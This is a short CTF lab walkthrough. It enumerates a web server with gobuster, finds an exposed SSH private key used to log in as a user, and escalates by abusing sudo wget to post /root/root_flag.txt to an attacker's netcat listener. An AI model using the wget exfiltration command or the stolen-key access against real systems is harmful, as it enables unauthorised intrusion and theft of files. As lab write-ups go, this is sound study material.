
[[CTF Notes]]

---
## Target IP: 10.10.58.138 

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

## Recon

- we visit the site hosted by Apache, and check the source. we find a name 'Jessie don't forget to change this'

- ran gobuster `gobuster dir -u http://10.10.58.138 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt`

- we find /sitemap and run the command again on the full url `http://10.10.58.138/sitemap`
 
- returns a dir '.ssh'

- in this is a id_rsa that we can copy to our machine and use to ssh into the user Jessie

### Privelige Escalation

- once inside with ssh we can get the user flag in the Documents dir.

- now time to see how we can get root

- `sudo -l`:

- we are allowed to run wget as sudo!

### Root

- first things first: open a nc listener `nc -nlvp 4445` on the home machine

- `wget --post-file=/root/root_flag.txt http://<YOUR_KALI_IP>:4445`

- this should print the `root_flag.txt` to the home machine!